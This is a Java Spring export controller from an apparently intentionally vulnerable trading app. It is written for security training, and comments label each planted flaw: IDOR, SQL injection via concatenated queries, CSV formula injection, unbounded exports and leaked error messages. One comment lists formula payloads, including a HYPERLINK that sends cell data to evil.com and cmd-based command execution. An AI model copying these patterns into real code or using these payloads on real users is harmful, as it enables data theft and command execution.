package com.vulntrade.controller;

import com.vulntrade.model.Order;
import com.vulntrade.repository.OrderRepository;
import com.vulntrade.repository.CustomQueryRepository;
import com.vulntrade.security.JwtTokenProvider;
import org.springframework.http.ResponseEntity;
import org.springframework.web.bind.annotation.*;

import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.PrintWriter;
import java.util.List;
import java.util.Map;

/**
 * Export controller for trade/order data.
 * VULN: CSV injection (formula injection in exported data).
 * VULN: No pagination - DoS via large export.
 * VULN: IDOR - can export any user's data.
 */
@RestController
@RequestMapping("/api/export")
public class ExportController {

    private final OrderRepository orderRepository;
    private final CustomQueryRepository customQueryRepository;
    private final JwtTokenProvider jwtTokenProvider;

    public ExportController(OrderRepository orderRepository,
                            CustomQueryRepository customQueryRepository,
                            JwtTokenProvider jwtTokenProvider) {
        this.orderRepository = orderRepository;
        this.customQueryRepository = customQueryRepository;
        this.jwtTokenProvider = jwtTokenProvider;
    }

    /**
     * Export trades to CSV.
     * VULN: CSV injection - formula injection in exported data.
     *       Cell values like =CMD("calc") or =HYPERLINK(...) will execute in Excel.
     * VULN: No pagination - DoS via requesting all trades.
     * VULN: IDOR - userId param allows exporting any user's trades.
     * VULN: No rate limiting on exports.
     */
    @GetMapping(value = "/trades", produces = "text/csv")
    public void exportTrades(
            @RequestParam(value = "userId", required = false) Long targetUserId,
            @RequestParam(value = "symbol", required = false) String symbol,
            @RequestParam(value = "format", required = false, defaultValue = "csv") String format,
            @RequestHeader(value = "Authorization", required = false) String authHeader,
            HttpServletResponse response) throws IOException {

        Long userId = extractUserId(authHeader);
        if (userId == null) {
            response.setStatus(401);
            response.getWriter().write("Authentication required");
            return;
        }

        // VULN: IDOR - if userId param provided, exports that user's data
        Long lookupUserId = (targetUserId != null) ? targetUserId : userId;

        response.setContentType("text/csv");
        response.setHeader("Content-Disposition",
            "attachment; filename=\"trades_user_" + lookupUserId + ".csv\"");

        PrintWriter writer = response.getWriter();

        // CSV Header
        writer.println("Order ID,User ID,Symbol,Side,Type,Quantity,Price,Status,Client Order ID,Created At,Executed At");

        // VULN: No pagination limit - fetches ALL orders (DoS possible)
        List<Order> orders = orderRepository.findByUserId(lookupUserId);

        for (Order order : orders) {
            // VULN: CSV Injection - values are NOT sanitized
            // If a user creates an order with clientOrderId like:
            //   =CMD("calc")
            //   =HYPERLINK("http://evil.com?data="&A1,"Click")
            //   +cmd|'/C calc'!A0
            //   @SUM(1+1)*cmd|'/C calc'!A0
            // These will execute when opened in Excel/LibreOffice
            writer.printf("%d,%d,%s,%s,%s,%s,%s,%s,%s,%s,%s%n",
                order.getId(),
                order.getUserId(),           // VULN: leaks userId
                order.getSymbol(),
                order.getSide(),
                order.getOrderType(),
                order.getQuantity(),
                order.getPrice(),
                order.getStatus(),
                order.getClientOrderId(),    // VULN: unsanitized - CSV injection vector
                order.getCreatedAt(),
                order.getExecutedAt() != null ? order.getExecutedAt() : "");
        }

        writer.flush();
    }

    /**
     * Export all trades (admin-level, but no real auth check).
     * VULN: No authorization - any authenticated user can export all trades.
     * VULN: Raw SQL used for flexibility (SQL injection via symbol param).
     */
    @GetMapping(value = "/all-trades", produces = "text/csv")
    public void exportAllTrades(
            @RequestParam(value = "symbol", required = false) String symbol,
            @RequestHeader(value = "Authorization", required = false) String authHeader,
            HttpServletResponse response) throws IOException {

        Long userId = extractUserId(authHeader);
        if (userId == null) {
            response.setStatus(401);
            response.getWriter().write("Authentication required");
            return;
        }

        response.setContentType("text/csv");
        response.setHeader("Content-Disposition", "attachment; filename=\"all_trades.csv\"");

        PrintWriter writer = response.getWriter();
        writer.println("Trade ID,Buy Order ID,Sell Order ID,Symbol,Quantity,Price,Executed At");

        try {
            // VULN: SQL injection via symbol parameter
            String sql;
            if (symbol != null && !symbol.isEmpty()) {
                sql = "SELECT id, buy_order_id, sell_order_id, symbol, quantity, price, executed_at " +
                      "FROM trades WHERE symbol = '" + symbol + "' ORDER BY executed_at DESC";
            } else {
                sql = "SELECT id, buy_order_id, sell_order_id, symbol, quantity, price, executed_at " +
                      "FROM trades ORDER BY executed_at DESC";
            }

            List<Object[]> results = customQueryRepository.executeRawQuery(sql);

            for (Object[] row : results) {
                StringBuilder line = new StringBuilder();
                for (int i = 0; i < row.length; i++) {
                    if (i > 0) line.append(",");
                    // VULN: No CSV sanitization
                    line.append(row[i] != null ? row[i].toString() : "");
                }
                writer.println(line);
            }
        } catch (Exception e) {
            // VULN: Error message reveals database structure
            writer.println("ERROR: " + e.getMessage());
        }

        writer.flush();
    }

    /**
     * Export user portfolio as JSON (with too much info).
     * VULN: IDOR + information disclosure.
     */
    @GetMapping("/portfolio")
    public ResponseEntity<?> exportPortfolio(
            @RequestParam(value = "userId", required = false) Long targetUserId,
            @RequestHeader(value = "Authorization", required = false) String authHeader) {

        Long userId = extractUserId(authHeader);
        if (userId == null) {
            return ResponseEntity.status(401).body(Map.of("error", "Authentication required"));
        }

        // VULN: IDOR
        Long lookupUserId = (targetUserId != null) ? targetUserId : userId;

        try {
            String sql = "SELECT p.symbol, p.quantity, p.avg_price, p.unrealized_pnl, " +
                         "s.current_price, s.bid, s.ask " +
                         "FROM positions p LEFT JOIN symbols s ON p.symbol = s.symbol " +
                         "WHERE p.user_id = " + lookupUserId;

            List<Object[]> results = customQueryRepository.executeRawQuery(sql);

            return ResponseEntity.ok(Map.of(
                "userId", lookupUserId,
                "positions", results,
                "exportedAt", java.time.LocalDateTime.now(),
                "exportedBy", userId  // VULN: reveals who requested
            ));
        } catch (Exception e) {
            return ResponseEntity.status(500).body(Map.of("error", e.getMessage()));
        }
    }

    private Long extractUserId(String authHeader) {
        if (authHeader == null || !authHeader.startsWith("Bearer ")) {
            return null;
        }
        try {
            String token = authHeader.substring(7);
            return jwtTokenProvider.getUserIdFromToken(token);
        } catch (Exception e) {
            return null;
        }
    }
}
